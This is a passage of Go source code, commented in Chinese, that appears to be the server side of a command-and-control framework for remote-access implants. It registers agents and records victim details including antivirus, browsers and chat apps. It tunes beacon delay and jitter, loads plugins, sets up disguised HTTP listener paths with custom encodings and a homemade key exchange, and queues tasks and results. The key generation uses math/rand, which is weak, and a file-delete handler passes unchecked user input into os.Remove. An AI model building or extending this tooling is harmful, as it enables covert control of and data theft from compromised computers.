                        UserUploadFile(uid,filename,splitSize,file)   
                    case "change_pro":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                            Jitter   string `json:"jitter"`
                            Taskid  string `json:"taskid"` // 添加 Taskid 字段
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        result := Change_pro(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay, requestData.Jitter, requestData.Taskid)
                        w.Header().Set("Content-Type", "application/json")
                        switch result {
                            case "confirm":
                                w.WriteHeader(http.StatusOK)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "200",
                                    "status":  "success",
                                    "message": "changes applied",
                                })
                            case "nil":
                                w.WriteHeader(http.StatusNotFound)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "404",
                                    "status":  "error",
                                    "message": "client not found",
                                })
                            default:
                                w.WriteHeader(http.StatusBadRequest)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "400",
                                    "status":  "error",
                                    "message": result,
                                })
                        }
                    case "change":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                            Jitter   string `json:"jitter"`
                            Taskid  string `json:"taskid"` // 添加 Taskid 字段
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        result := Change(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay, requestData.Jitter, requestData.Taskid)
                        w.Header().Set("Content-Type", "application/json")
                        switch result {
                            case "confirm":
                                w.WriteHeader(http.StatusOK)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "200",
                                    "status":  "success",
                                    "message": "changes applied",
                                })
                            case "nil":
                                w.WriteHeader(http.StatusNotFound)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "404",
                                    "status":  "error",
                                    "message": "client not found",
                                })
                            default:
                                w.WriteHeader(http.StatusBadRequest)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "400",
                                    "status":  "error",
                                    "message": result,
                                })
                        }
                    case "insertPlugin":
                        // 插入插件
                        var requestData struct {
                            Remark         string `json:"remark"`
                            Code           string `json:"code"`
                            CodeWords      string `json:"codeWords"`
                            Os             string `json:"os"`
                            Parameter      string `json:"parameter"`
                            ParameterDesc  string `json:"parameterDesc"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Remark == "" || requestData.Code == "" || requestData.Os == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        serverPluginMu.Lock()
                        defer serverPluginMu.Unlock()
                        for i := range server_plugin.Plugins {
                            plugin := &server_plugin.Plugins[i]
                            if plugin.CodeWord == requestData.CodeWords && plugin.os == requestData.Os && plugin.Remark == requestData.Remark {
                                http.Error(w, "CodeWords already exists: "+requestData.CodeWords, http.StatusBadRequest)
                                return
                            }
                        }
                        //用逗号分割parameter
                        parameterParts := strings.Split(requestData.Parameter, ",")
                        //如果分割不了那就是只有一个参数
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            parameterParts = []string{parameterParts[0]}
                        }
                        if parameterParts == nil || len(parameterParts) == 0 {
                            http.Error(w, "Parameter fields must not be empty", http.StatusBadRequest)
                            return
                        }
                        ParameterDesc := strings.Split(requestData.ParameterDesc, ",")
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            ParameterDesc = []string{ParameterDesc[0]}
                        }
                        // 检查参数是否重复和不为空
                        paramSet := make(map[string]bool)
                        for _, p := range parameterParts {
                            if paramSet[p] {
                                http.Error(w, "Parameter fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                paramSet[p] = true
                            }
                        }
                        // 插入插件到 serverPlugin
                        plugin := Plugin{
                            Remark:       requestData.Remark,
                            Code:       requestData.Code,
                            CodeWord: requestData.CodeWords,
                            os:         requestData.Os,
                            parameter:  parameterParts,
                            ParameterDesc: ParameterDesc,
                        }
                        server_plugin.Plugins = append(server_plugin.Plugins, plugin)
                        // 插入成功后返回成功消息
                        logger.WriteLog(fmt.Sprintf(log_word["plugin_code"], requestData.Remark, requestData.Code))
                        fmt.Fprintf(w, "Plugin inserted successfully for %s", requestData.Remark)
                    case "sendChat":
                        // 1. 读取请求体
                        body, err := io.ReadAll(r.Body)
                        if err != nil {
                            http.Error(w, "cannot read body", http.StatusBadRequest)
                            return
                        }
                        // 2. 解析 JSON
                        var requestData struct {
                            Username string `json:"username"`
                            Message  string `json:"message"`
                            Chatid   int    `json:"chatid"`
                            Type     string `json:"type"`
                        }
                        err = json.Unmarshal(body, &requestData)
                        if err != nil {
                            http.Error(w, "invalid JSON", http.StatusBadRequest)
                            return
                        }
                    
                        // 3. 构造 Chat 并插入
                        chat := Chat{
                            Username: requestData.Username,
                            Message:  requestData.Message,
                            Time:     time.Now().Format("2006-01-02 15:04:05"),
                            Chatid:   requestData.Chatid,
                            Type:     "message",
                        }
                        dataChatmu.Lock()
                        defer dataChatmu.Unlock()
                        data_chat.Chats = append(data_chat.Chats, chat)
                    
                        // 4. 返回成功
                        logger.WriteLog(fmt.Sprintf(log_word["chat_message"], requestData.Username, requestData.Message))
                        w.Header().Set("Content-Type", "application/json")
                        w.WriteHeader(http.StatusOK)
                        json.NewEncoder(w).Encode(chat)                    
                    case "deleteChat":
                        body, err := io.ReadAll(r.Body)
                        if err != nil {
                            http.Error(w, "cannot read body", http.StatusBadRequest)
                            return
                        }
                        var requestData struct {
                            Chatid   int    `json:"chatid"`
                            Username string `json:"username"`
                            Message  string `json:"message"`
                        }
                        err = json.Unmarshal(body, &requestData)
                        if err != nil {
                            http.Error(w, "invalid JSON", http.StatusBadRequest)
                            return
                        }
                        var deletedType string
                        dataChatmu.Lock()
                        for i := len(data_chat.Chats) - 1; i >= 0; i-- {
                            chat := &data_chat.Chats[i]
                            if chat.Chatid == requestData.Chatid && chat.Username == requestData.Username {
                                deletedType = chat.Type
                                data_chat.Chats = append(data_chat.Chats[:i], data_chat.Chats[i+1:]...)
                                break
                            }
                        }
                        dataChatmu.Unlock()
                        // 如果是文件，顺便删除服务器上的文件
                        if deletedType == "file" {
                            filePath := "./chat_uploads/"+ requestData.Message
                            os.Remove(filePath) // 忽略错误，可根据需要 log
                        }
                        response, _ := json.Marshal(map[string]string{
                            "status": "deleted",
                            "chatid": strconv.Itoa(requestData.Chatid),
                        })
                        w.Header().Set("Content-Type", "application/json")
                        w.WriteHeader(http.StatusOK)
                        w.Write(response)                    
                    case "chatFile":
                        username := r.FormValue("username")
                        chatidStr := r.FormValue("chatid")
                        chatid, _ := strconv.Atoi(chatidStr)
                        file, fileHeader, err := r.FormFile("chatFile")
                        if err != nil {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        defer file.Close()
                        // 存储目录
                        uploadDir := "./chat_uploads/"
                        os.MkdirAll(uploadDir, 0755)
                        filename := fmt.Sprintf("%d_%s", chatid, fileHeader.Filename)
                        filepath := uploadDir + filename
                        dst, err := os.Create(filepath)
                        if err != nil {
                            http.Error(w, "file save failed", http.StatusInternalServerError)
                            return
                        }
                        defer dst.Close()
                        io.Copy(dst, file)
                        chat := Chat{
                            Username: username,
                            Message:  filename,
                            Time:     time.Now().Format("2006-01-02 15:04:05"),
                            Chatid:   chatid,
                            Type:     "file",
                        }
                        dataChatmu.Lock()
                        defer dataChatmu.Unlock()
                        data_chat.Chats = append(data_chat.Chats, chat)
                        logger.WriteLog(fmt.Sprintf(log_word["chat_file"], chat.Username, chat.Message))
                        w.Header().Set("Content-Type", "application/json")
                        w.WriteHeader(http.StatusOK)
                        json.NewEncoder(w).Encode(chat)                    
                    case "startServer":
                        var requestData struct {
                            Port         string `json:"port"`
                            Path         string `json:"path"`
                            ConnPath     string `json:"connPath"`
                            MsgPath      string `json:"msgPath"`
                            SwitchKey    string `json:"switch_key"`
                            EncryKey     string `json:"encry_key"`
                            Download     string `json:"download"`
                            Result       string `json:"result"`
                            Net          string `json:"net"`
                            Info         string `json:"info"`
                            Upload       string `json:"upload"`
                            List         string `json:"list"`
                            Option       string `json:"option"`
                            Uid          string `json:"uid"`
                            Hostname     string `json:"hostname"`
                            KeyPart      string `json:"keyPart"`
                            Filekey      string `json:"filekey"`
                            Protocol     string `json:"protocol"`
                            User         string `json:"user"`
                            Remark       string `json:"remark"`
                            CertContent  string `json:"cert"`
                            KeyContent   string `json:"key"`
                            WindowsPro   string `json:"Group_pro"`
                            BaseRounds   string `json:"base_rounds"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Path == "" || requestData.Port == "" || requestData.Protocol == "" || requestData.Remark == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        serverDataMu.RLock()
                        for i := range server_data.Servers {
                            server := &server_data.Servers[i]
                            if requestData.Port == server.Port || requestData.Remark == server.Remark {
                                http.Error(w, "Port occupancy or remark already exists", http.StatusBadRequest)
                                serverDataMu.RUnlock() 
                                return
                            }
                        }
                        serverDataMu.RUnlock()
                        paths := []string{
                            requestData.ConnPath,
                            requestData.MsgPath,
                            requestData.SwitchKey,
                            requestData.EncryKey,
                            requestData.Download,
                            requestData.Result,
                            requestData.Net,
                            requestData.Info,
                            requestData.Upload,
                            requestData.List,
                            requestData.Option,
                            requestData.Uid,
                            requestData.Hostname,
                            requestData.KeyPart,
                            requestData.Filekey,
                            requestData.User,
                        }
                        pathSet := make(map[string]bool)
                        // 检查路径是否重复和不为空
                        for _, p := range paths {
                            if pathSet[p] {
                                http.Error(w, "Path fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                pathSet[p] = true
                            }
                        }
                        if requestData.BaseRounds != "" {
                            baseRounds := requestData.BaseRounds
                            // 判断 baseRounds 是否符合 base64表规则（长度64且无重复字符）
                            if len(baseRounds) != 64 {
                                http.Error(w, "Base64 table must be 64 characters", http.StatusBadRequest)
                                return
                            }
                            charSet := make(map[rune]bool)
                            for _, c := range baseRounds {
                                if charSet[c] {
                                    http.Error(w, "Base64 table contains duplicate characters", http.StatusBadRequest)
                                    return
                                }
                                charSet[c] = true
                            }
                            decodeMap := buildDecodeMap(baseRounds)

                            baseMutex.Lock()
                            base_map[requestData.Port] = baseRounds
                            baseMutex.Unlock()
                            cmapMutex.Lock()
                            code_map[requestData.Port] = decodeMap
                            cmapMutex.Unlock()

                        } else {
                            base_rounds := generateRandomBase64Table()
                            decodeMap := buildDecodeMap(base_rounds)

                            baseMutex.Lock()
                            base_map[requestData.Port] = base_rounds
                            baseMutex.Unlock()
                            cmapMutex.Lock()
                            code_map[requestData.Port] = decodeMap
                            cmapMutex.Unlock()

                            requestData.BaseRounds = base_rounds
                        }
                        if requestData.Protocol == "https" || requestData.Protocol == "http" {
                            handler := &MainHandler{}
                            serverManager := &MyServer{}
                            protocol.Http_server(handler, serverManager, logger, requestData.Port, requestData.Path,
                                requestData.ConnPath, requestData.MsgPath, requestData.SwitchKey, requestData.EncryKey,
                                requestData.Download, requestData.Result, requestData.Net, requestData.Info, requestData.Upload,
                                requestData.List, requestData.Option, requestData.Protocol, requestData.Uid, requestData.User,
                                requestData.Hostname, requestData.KeyPart, requestData.Filekey, requestData.Remark,
                                requestData.CertContent, requestData.KeyContent,requestData.WindowsPro,requestData.BaseRounds,log_word)
                        }
            }
		}
	}
}
//接收
func GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
    var server_remark string
    data := Get_decry_s(&encry_str, &key,code_map)
    data_list := strings.Split(data,"^")
    if len(data_list) < 11 {  // 需要11个字段
        return
    }
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    port := data_list[7]
    protocol := data_list[8]
    jitter := data_list[9]
    executable := data_list[10]
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    Remarks := "null"
    hash:=md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt,_:= strconv.Atoi(t)
    jitterInt,_:= strconv.Atoi(jitter)

    serverChan := make(chan string)
    go updateServerClients(port, protocol, serverChan)
    server_remark = <-serverChan

    put_client(username, shellname, osname, formattedTime, clientIP,currentDir,version,innet_ip,Remarks,uid,server_remark,executable,timeInt,jitterInt)
    log_str1 := fmt.Sprintf(log_word["agent_online"],
    username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:])
    logger.WriteLog(log_str1)
    DeleteEntry(uid)
}
func Windows_GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
    data := Get_decry_s(&encry_str, &key, code_map)
    data_list := strings.Split(data, "^")
    if len(data_list) < 19 {  // 需要11个字段
        return
    }
    // 解析 Windows 专用的扩展字段
    shellname := data_list[0]
    username := data_list[1]
    osname := data_list[2]
    t := data_list[3]
    innet_ip := data_list[4]
    currentDir := data_list[5]
    version := data_list[6]
    port := data_list[7]
    protocol := data_list[8]
    jitter := data_list[9]
    executable := data_list[10]
    macs := data_list[11]           // MAC地址
    cpuInfo := data_list[12]        // CPU信息
    antivirus := data_list[13]      // 杀毒软件
    browsers := data_list[14]       // 浏览器信息
    chatApps := data_list[15]       // 聊天应用
    memoryStr := data_list[16]      // 内存使用情况
    systemType := data_list[17]     // 系统类型
    arch := data_list[18]           // 架构信息
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    // 计算 key hash
    hash := md5.New()
    hash.Write([]byte(key))
    hashBytes := hash.Sum(nil)
    hashString := hex.EncodeToString(hashBytes)
    timeInt, _ := strconv.Atoi(t)
    jitterInt, _ := strconv.Atoi(jitter)
    // 查找并更新服务器客户端数量

    var server_remark string
    serverChan := make(chan string)
    go updateServerClients(port, protocol, serverChan)
    server_remark = <-serverChan

    Remarks := "null"
    Windows_put_client(username, shellname, osname, formattedTime, clientIP, currentDir, version, innet_ip, Remarks, uid, server_remark, executable, timeInt, jitterInt, macs, cpuInfo, antivirus, browsers, chatApps, memoryStr, systemType, arch)
    // 记录详细的 Windows 信息日志
    log_str := fmt.Sprintf(log_word["windows_agent_online"],
        username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:], macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
    logger.WriteLog(log_str)
    // 删除连接条目
    DeleteEntry(uid)
}
func updateServerClients(port, protocol string, serverChan chan<- string) {
    serverDataMu.Lock()
    defer serverDataMu.Unlock()

    var serverRemark string
    for i := range server_data.Servers {
        server := &server_data.Servers[i]
        if port == server.Port && strings.HasPrefix(protocol, server.Protocol) {
            server.Clients++
            serverRemark = server.Remark
            break
        }
    }
    serverChan <- serverRemark
}
func Change_pro(uid, username, remarks, delay, jitter, Taskid string) string {
    windows_clientMu.Lock()
    defer windows_clientMu.Unlock()
    for i := range windows_client_data.Clients {
        client := &windows_client_data.Clients[i]
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil { return "delay is not int" }
            int_jitter, err := strconv.Atoi(jitter)
            if err != nil { return "jitter is not int" }

            usernameModified, remarksModified := false, false
            delayModified, jitterModified := false, false

            if username != client.Username {
                userExists := false
                for j := range windows_client_data.Clients {
                    if windows_client_data.Clients[j].Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists { return "user already exists" }
                client.Username = username
                usernameModified = true
            }
            if remarks != client.Remarks {
                client.Remarks = remarks
                remarksModified = true
            }
            if int_delay != client.Delay {
                if int_delay < 1 { int_delay = 1 }
                client.Delay = int_delay
                delayModified = true
                Getcmd(uid, "GET_DELAY^"+delay, Taskid)
            }
            if int_jitter != client.Jitter {
                if int_jitter <= 0 { int_jitter = 5 }
                client.Jitter = int_jitter
                jitterModified = true
                Getcmd(uid, "GET_JITTER^"+jitter, Taskid)
            }
            if !usernameModified && !remarksModified && !delayModified && !jitterModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Change(uid, username, remarks, delay, jitter, Taskid string) string {
    clientDataMu.Lock()
    defer clientDataMu.Unlock()
    for i := range client_data.Clients {
        client := &client_data.Clients[i]
        if uid == client.Uid {
            int_delay, err := strconv.Atoi(delay)
            if err != nil {
                return "delay is not int"
            }
            int_jitter, err := strconv.Atoi(jitter)
            if err != nil {
                return "jitter is not int"
            }
            usernameModified := false
            remarksModified := false
            delayModified := false
            jitterModified := false
            if username != client.Username {
                userExists := false
                for j := range client_data.Clients {
                    if client_data.Clients[j].Username == username {
                        userExists = true
                        break
                    }
                }
                if userExists {
                    return "user already exists"
                }
                client.Username = username
                usernameModified = true
            }      
            if remarks != client.Remarks {
                client.Remarks = remarks
                remarksModified = true
            }
            if int_delay != client.Delay {
                if int_delay < 1 {
                    int_delay = 1
                }
                client.Delay = int_delay
                delayModified = true
                cmd := "GET_DELAY^"+delay
                Getcmd(uid,cmd,Taskid)
            }
            if int_jitter != client.Jitter {
                if int_jitter <= 0 {
                    int_jitter = 5
                }
                client.Jitter = int_jitter
                jitterModified = true
                cmd := "GET_JITTER^"+jitter
                Getcmd(uid,cmd,Taskid)
            }
            if !usernameModified && !remarksModified && !delayModified && !jitterModified {
                return "No changes needed"
            }
            return "confirm"
        }
    }
    return "nil"
}
func Confirm_chan(uid, username string) (Client, error) {
    clientDataMu.RLock()
    defer clientDataMu.RUnlock()
    for i := range client_data.Clients {
        client := &client_data.Clients[i] // 指针查找
        if uid == client.Uid && username == client.Username {
            return *client, nil // 找到后解引用返回副本
        }
    }
    return Client{}, fmt.Errorf("client not found")
}

func getClientIP(r *http.Request) string {
	forwarded := r.Header.Get("X-Forwarded-For")
	if forwarded != "" {
		ip := forwarded
		if comma := strings.Index(forwarded, ","); comma > 0 {
			ip = forwarded[:comma]
		}
		return ip
	}
	realIP := r.Header.Get("X-Real-IP")
	if realIP != "" {
		return realIP
	}
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return ip
}
// 返回给前端的 JSON 结构
type ClientInfo struct {
    Uid        string `json:"uid"`
    Host       string `json:"host"`
    OnlineTime string `json:"online_time"`
    ShellIP    string `json:"shell_ip"`
}
func Listen(username string) string {
    seen := make(map[string]bool)
    clients := make([]ClientInfo, 0, len(data_conn.Conns))
    dataConnMu.RLock()
    defer dataConnMu.RUnlock()
    for i := range data_conn.Conns {
        client := &data_conn.Conns[i]
        if client.Username != username {
            continue
        }
        if client.Uid == "" {
            continue
        }
        if seen[client.Uid] {
            continue
        }
        seen[client.Uid] = true
        clients = append(clients, ClientInfo{
            Uid:        client.Uid,
            Host:       client.Host,
            OnlineTime: client.OnlineTime,
            ShellIP:    client.ShellIP,
        })
    }
    b, err := json.Marshal(clients)
    if err != nil {
        return "[]"
    }
    return string(b)
}

func Get_conn(uid, username, hostname, clientIP, base_rounds string) string {
    current := time.Now()
    formattedTime := current.Format("2006.01.02 15:04")
    put_conn(username, hostname, formattedTime, uid, clientIP, "null")

    keyMu.Lock()
    delete(key_map, uid)
    keyMu.Unlock()

    key1Mu.Lock()
    key1_map[uid] = nil
    key1Mu.Unlock()

    key2Mu.Lock()
    key2_map[uid] = nil
    key2Mu.Unlock()

    key3Mu.Lock()
    key3_map[uid] = nil
    key3Mu.Unlock()

    for {
        if insert_key1_map(uid, base_rounds) {
            break
        }
        time.Sleep(time.Second)
    }

    key2Mu.RLock()
    pubKeyBytes, ok := key2_map[uid] // []byte
    key2Mu.RUnlock()
    if !ok {
        return ""
    }
    encoded := customBase64Encode(pubKeyBytes, base_rounds)
    return encoded
}
func onlyHex(s string) string {
	out := make([]rune, 0, len(s))
	for _, c := range s {
		if (c >= '0' && c <= '9') ||
			(c >= 'a' && c <= 'f') ||
			(c >= 'A' && c <= 'F') {
			out = append(out, c)
		}
	}
	return string(out)
}
// 生成 [0, max) 的 *big.Int
func randBigInt(max *big.Int) *big.Int {
	if max.BitLen() <= 63 {
		return big.NewInt(rand.Int63()).Mod(big.NewInt(rand.Int63()), max)
	}
	return big.NewInt(rand.Int63()).Mod(big.NewInt(rand.Int63()), max)
}
// 从 raw 派生 p
func deriveP(raw string) *big.Int {
	hexStr := onlyHex(raw)
	// 拼接一些固定高位，让 p 足够大
	pStr := "FFFFFFFFFFFF" + hexStr
	p, ok := new(big.Int).SetString(pStr, 16)
	if !ok {
		return nil
	}
	return p
}
// 从 p 派生 g（保证 g>=2, g<p）
func deriveG(p *big.Int) *big.Int {
	bits := byte(0)
	for i := 1024; i < 1032; i++ {
		bits = bits<<1 + byte(p.Bit(i))
	}
	g := big.NewInt(int64(bits))
	if g.Cmp(big.NewInt(2)) < 0 {
		g.Add(g, big.NewInt(2))
	}
	if g.Cmp(p) >= 0 {
		g.Mod(g, new(big.Int).Sub(p, big.NewInt(2)))
		g.Add(g, big.NewInt(2))
	}
	return g
}
func insert_key1_map(uid, base_rounds string) bool {
    p := deriveP(base_rounds)
    if p == nil {
        return false
    }
    g := deriveG(p)

    a := randBigInt(p)
    A := new(big.Int).Exp(g, a, p)
    aBytes := a.Bytes()
    ABytes := A.Bytes()

    key1Mu.Lock()
    key1_map[uid] = aBytes  // 私钥
    key1Mu.Unlock()
    key2Mu.Lock()
    key2_map[uid] = ABytes // 公钥
    key2Mu.Unlock()
    return true
}

//接收客户端中间值添加与服务器私钥交互计算出最终密钥再与data_conn.Conns[i].HostKey交互返回给客户端
func Switch_key(uid string, clientPubKeyBytes []byte, base_rounds string) error {
    dataConnMu.RLock()
    defer dataConnMu.RUnlock()

    for i := range data_conn.Conns {
        conn := &data_conn.Conns[i]
        if uid != conn.Uid {
            continue
        }

        // 从 key1_map 获取服务端私钥 a
        key1Mu.RLock()
        privateKeyInts, exists := key1_map[uid]
        key1Mu.RUnlock()
        if !exists || len(privateKeyInts) == 0 {
            return nil
        }

        // 转回 big.Int
        privBytes := make([]byte, len(privateKeyInts))
        for i, val := range privateKeyInts {
            privBytes[i] = byte(val)
        }
        serverPrivateKey := new(big.Int).SetBytes(privBytes)

        // 直接用传入的 []byte 客户端公钥
        if len(clientPubKeyBytes) == 0 {
            return nil
        }
        clientPubKey := new(big.Int).SetBytes(clientPubKeyBytes)

        // 重新派生 p
        p := deriveP(base_rounds)
        if p == nil {
            return nil
        }

        // 计算共享密钥 shared = (clientPubKey ^ serverPrivateKey) mod p
        shared := new(big.Int).Exp(clientPubKey, serverPrivateKey, p)
        sharedBytes := shared.Bytes()

        // 存到 key3_map，转成 []int
        sharedInts := make([]int, len(sharedBytes))
        for i, b := range sharedBytes {
            sharedInts[i] = int(b)
        }

        key3Mu.Lock()
        key3_map[uid] = sharedInts
        key3Mu.Unlock()

        return nil
    }

    return nil
}

func EncryptHostKey(uid, key string) {
    // 取最终共享密钥
    key3Mu.RLock()
    sharedKeyInts, ok := key3_map[uid]
    key3Mu.RUnlock()
    if !ok || len(sharedKeyInts) == 0 {
        return
    }
    clientKey := []byte(key)
    sharedLen := len(sharedKeyInts)
    // 直接索引对索引 XOR
    for i := 0; i < len(clientKey); i++ {
        idx := i % sharedLen // 循环索引
        clientKey[i] ^= byte(sharedKeyInts[idx])
    }
    keyMu.Lock()
    key_map[uid] = string(clientKey)
    keyMu.Unlock()
}

//插入密钥
func Insert_key(uid, username, shellname string) {
    charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    rand.Seed(time.Now().UnixNano())
    keyLength := rand.Intn(255) + 1030 // 密钥长度在1030到1284之间
    keyBuilder := strings.Builder{}
    // 生成密钥
    for i := 0; i < keyLength; i++ {
        randomIndex := rand.Intn(len(charset))
        keyBuilder.WriteByte(charset[randomIndex])
    }
    // 拼接完成的密钥
    key := keyBuilder.String()
    // 查找并更新对应的连接
    for i := range data_conn.Conns {
        conn := &data_conn.Conns[i]
        if uid == conn.Uid && username == conn.Username && shellname == conn.Host {
            conn.HostKey = key 
            break
        }
    }
}

func DeleteEntry(delshell string) {
    if delshell == "" {
        return
    }
    dataConnMu.Lock()
    defer dataConnMu.Unlock()
    for i := range data_conn.Conns {
        if data_conn.Conns[i].Uid == delshell {
            data_conn.Conns = append(data_conn.Conns[:i], data_conn.Conns[i+1:]...)
            break 
        }
    }
}

//写入目录列表
func Put_file_list(uid, file, taskid string, code_rounds map[byte]int) {
    keyMu.RLock()
    key, exists := key_map[uid]
    keyMu.RUnlock()
    if !exists {
        return
    }
    decryptedData := Get_decry_s(&file, &key, code_rounds)
    var dir, list string
    parts := strings.SplitN(decryptedData, "^", 2)
    if len(parts) == 2 {
        list = parts[0]
        dir = parts[1]
    } else {
        dir = decryptedData
    }
    fileMu.RLock()
    queue, ok := msgFileQueue[uid]
    fileMu.RUnlock()
    if !ok {
        fileMu.Lock()
        if queue, ok = msgFileQueue[uid]; !ok {
            queue = &fileQueue{files: make([]Msg_file, 0)}
            msgFileQueue[uid] = queue
        }
        fileMu.Unlock()
    }
    queue.mu.Lock()
    queue.files = append(queue.files, Msg_file{
        Uid:    uid,
        Taskid: taskid,
        File:   dir,
    })
    queue.mu.Unlock()
    go save_file_list(uid, dir, list)
}

//读取文件列表
func Get_file_list(uid, taskid string) string {
    // 1. 快速定位该 UID 的队列
    fileMu.RLock()
    queue, exists := msgFileQueue[uid]
    fileMu.RUnlock()
    if !exists {
        return ""
    }
    queue.mu.Lock()
    defer queue.mu.Unlock()
    for i := range queue.files {
        item := &queue.files[i]
        if item.Taskid == taskid {
            fileContent := item.File
            queue.files = append(queue.files[:i], queue.files[i+1:]...)
            return fileContent
        }
    }
    return ""
}
//按索引删除客户端目录缓存
func Del_file_list(uid, indexStr string) {
    fcache.Lock()
    defer fcache.Unlock()
    index, err := strconv.Atoi(indexStr)
    if err != nil {
        return
    }
    // 找到 uid 对应的所有文件的索引
    var uidIndices []int
    for i := range msg_file_cache {
        item := &msg_file_cache[i]
        if item.Uid == uid {
            uidIndices = append(uidIndices, i)
        }
    }
    if index < 0 || index >= len(uidIndices) {
        return
    }
    // 删除对应索引的文件
    delIdx := uidIndices[index]
    msg_file_cache = append(msg_file_cache[:delIdx], msg_file_cache[delIdx+1:]...)
}
//读取目录缓存给客户端
type file_json struct {
    List string `json:"list"`
    File string `json:"file"`
}
func Read_file_list(uid string) []file_json{
    fcache.RLock()
    defer fcache.RUnlock()
    // 只收集匹配的文件，不删除
    var fileList []file_json
    for i := range msg_file_cache {
        item := &msg_file_cache[i]
        if item.Uid == uid {
            file_json := file_json{
                List: item.Taskid,
                File: item.File,
            }
            fileList = append(fileList, file_json)
        }
    }
    return fileList
}
//缓存客户端目录
func save_file_list(uid, file, list string) {
    fcache.Lock()
    defer fcache.Unlock()
    for i := range msg_file_cache {
        item := &msg_file_cache[i]
        if item.Uid == uid && item.Taskid == list {
            item.File = file
            return
        }
    }
    // 不存在则追加
    msg_file_cache = append(msg_file_cache, Msg_file{
        Uid:  uid,
        Taskid: list,
        File: file,
    })
}

//缓存客户端消息
func SaveMsg(uid,msg,Taskid string) {
    mapMu.Lock()
    defer mapMu.Unlock()
    msg_map_list = append(msg_map_list, Msg_result{
        Uid:    uid,
        Result: msg,
        Taskid: Taskid,
    })
}
func getOrCreateQueue(uid string) *uidMsgQueue { 
    queuesMu.RLock() 
    q := msgQueues[uid] 
    queuesMu.RUnlock() 
    if q != nil { 
        return q 
    } 
    queuesMu.Lock()  
    q = msgQueues[uid]
    if q == nil {
        q = &uidMsgQueue{messages: make([]Msg_get, 0, 16)} 
        msgQueues[uid] = q 
    }
    queuesMu.Unlock() 
    return q 
}
func ChangeMsh(uid, s_id, pos string) (bool, string) {
    if uid == "" {
        return false, "missing uid"
    }

    sID, err1 := strconv.Atoi(s_id)
    posI, err2 := strconv.Atoi(pos)
    if err1 != nil || err2 != nil {
        return false, "invalid s_id/pos"
    }

    queuesMu.RLock()
    q := msgQueues[uid]
    queuesMu.RUnlock()
    if q == nil {
        return false, "queue not found"
    }

    q.mu.Lock()
    defer q.mu.Unlock()

    n := len(q.messages)
    if n == 0 {
        return false, "queue empty"
    }
    if sID < 0 || sID >= n {
        return false, "s_id out of range"
    }
    if posI < 0 || posI >= n {
        return false, "pos out of range"
    }

    item := q.messages[sID]

    // 删除 sID
    q.messages = append(q.messages[:sID], q.messages[sID+1:]...)

    // 如果 sID 在 pos 之前，删除后 pos 需要 -1
    if sID < posI {
        posI--
    }

    // 插入到 pos 前面
    q.messages = append(q.messages, Msg_get{})
    copy(q.messages[posI+1:], q.messages[posI:])
    q.messages[posI] = item

    return true, ""
}

//将msg_map输出
func GetMsgList(uid string) []string {
    if uid == "" {
        return nil
    }
    queuesMu.RLock()
    q := msgQueues[uid]
    queuesMu.RUnlock()
    if q == nil {
        return nil
    }
    q.mu.Lock()
    defer q.mu.Unlock()
    result := make([]string, 0, len(q.messages))
    for i := range q.messages {
        item := &q.messages[i]
        entry := fmt.Sprintf("%s:\t%s", item.Taskid, item.Ori_Msg)
        result = append(result, entry)
    }
    return result
}

// 获取结果
func Getresults(uid, taskid string) string {
    // 1. 先用读锁看这个 UID 的队列是否存在
    resultMu.RLock()
    queue, exists := msgResultQueues[uid]
    resultMu.RUnlock()
    if !exists {
